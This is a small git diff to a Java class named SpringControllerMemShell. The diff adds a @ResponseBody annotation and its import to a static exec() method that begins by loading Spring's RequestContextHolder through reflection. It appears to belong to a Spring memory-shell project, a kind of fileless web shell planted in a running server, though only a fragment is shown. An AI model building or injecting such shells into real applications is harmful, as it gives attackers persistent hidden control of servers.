@@ -1,5 +1,6 @@
 package com.example.springmemshell.memshell;
 
+import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.context.WebApplicationContext;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
@@ -66,6 +67,7 @@ public class SpringControllerMemShell {
         }
     }
 
+    @ResponseBody
     public static void exec() {
         try {
             Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
